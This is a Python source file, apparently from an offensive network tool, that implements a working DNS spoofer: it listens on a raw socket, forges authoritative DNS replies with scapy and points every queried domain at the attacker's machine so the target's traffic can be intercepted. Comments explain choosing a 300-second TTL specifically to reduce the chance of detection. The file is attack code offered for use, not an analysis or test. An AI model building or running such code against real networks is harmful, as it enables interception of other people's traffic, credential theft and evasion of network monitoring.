import asyncio
import logging
import socket

logger = logging.getLogger(__name__)


class DNSSpoofer:
    """Intercepts DNS requests and replies with a spoofed IP address.

    The ``spoof_ip`` should be the IP address of the attacker/Nyx machine so
    that DNS clients resolve domain names to *us* (and we then forward/proxy
    the traffic). Using ``0.0.0.0`` here is a common mistake — it results in
    unreachable addresses and breaks the target's connectivity instead of
    intercepting it.
    """

    def __init__(self, spoof_ip: str, listen_ip: str = "0.0.0.0", dns_port: int = 53):
        """Initialise the DNS spoofer with the target spoof IP and listen address."""
        self.spoof_ip = spoof_ip
        self.listen_ip = listen_ip
        self.dns_port = dns_port
        self._running = False
        self._task: asyncio.Task | None = None
        self._sock: socket.socket | None = None

    async def start(self):
        """Start the DNS spoofing loop.

        The raw socket is created and bound *before* the task is marked as
        running, so a failure (e.g. missing admin rights, port 53 in use)
        raises here instead of silently leaving the flag ``True`` — the caller
        can then report DNS spoofing as inactive instead of "active".
        """
        if self._running:
            return
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.bind((self.listen_ip, self.dns_port))
        sock.setblocking(False)
        self._sock = sock
        self._running = True
        self._task = asyncio.create_task(self._dns_loop())
        logger.info(
            "DNS spoofer started on %s:%d -> %s (TTL=300s)",
            self.listen_ip, self.dns_port, self.spoof_ip,
        )

    async def stop(self):
        """Stop the DNS spoofing loop and close the raw socket."""
        self._running = False
        if self._task:
            self._task.cancel()
            try:
                await self._task
            except (asyncio.CancelledError, PermissionError, OSError):
                pass
            self._task = None
            if self._sock:
                try:
                    self._sock.close()
                except OSError:
                    pass
                self._sock = None
        logger.info("DNS spoofer stopped")

    _scapy_initialized = False

    @staticmethod
    def _init_scapy():
        if not DNSSpoofer._scapy_initialized:
            from scapy.config import conf
            conf.verb = 0
            DNSSpoofer._scapy_initialized = True

    def _build_spoof_response(self, packet: bytes, addr: tuple | None = None) -> bytes | None:
        """Construct a forged DNS response pointing the queried domain to the spoof IP.

        TTL is set to 300 seconds (5 min) instead of 60s to reduce the
        frequency of DNS queries from the target (lower detection surface).

        ``packet_data`` is the raw datagram as received from the raw socket
        (with ``IP_HDRINCL`` the received packet starts with a full IPv4
        header), so we let scapy dissect it wholesale instead of blindly
        slicing at a fixed offset (an IP header can carry options).
        """
        self._init_scapy()
        from scapy.all import IP, UDP, DNS, DNSRR
        try:
            pkt = IP(packet)
            if IP not in pkt or UDP not in pkt:
                return None
            dns = pkt[DNS]
            if not dns or dns.qr != 0:
                return None
            qname = dns.qd.qname.decode("utf-8", errors="replace").rstrip(".")
            if not qname:
                return None

            # TTL 300s: reduces detection vs 60s (fewer DNS requests visible)
            spoofed = IP(src=pkt[IP].dst, dst=pkt[IP].src) / \
                      UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) / \
                      DNS(
                          id=dns.id,
                          qr=1,
                          aa=1,
                          qd=dns.qd,
                          an=DNSRR(rrname=dns.qd.qname, ttl=300, rdata=self.spoof_ip),
                      )
            return bytes(spoofed)
        except Exception as e:
            logger.debug("DNS spoof build error: %s", e)
        return None

    async def _dns_loop(self):
        """Listen for raw DNS queries and respond with spoofed answers."""
        try:
            loop = asyncio.get_event_loop()
            while self._running and self._sock:
                try:
                    data, addr = await loop.sock_recvfrom(self._sock, 65535)
                    response = await asyncio.to_thread(self._build_spoof_response, data)
                    if response:
                        # Raw sockets have no implicit peer — always sendto the
                        # source the query came from (IP, UDP sport).
                        await loop.sock_sendto(self._sock, response, addr)
                except BlockingIOError:
                    await asyncio.sleep(0.01)
                except (OSError, PermissionError) as e:
                    logger.debug("DNS loop error: %s", e)
                    await asyncio.sleep(0.1)
        except Exception as e:
            logger.error("DNS spoofer failed: %s", e)
        finally:
            self._running = False
            if self._sock:
                try:
                    self._sock.close()
                except OSError:
                    pass
                self._sock = None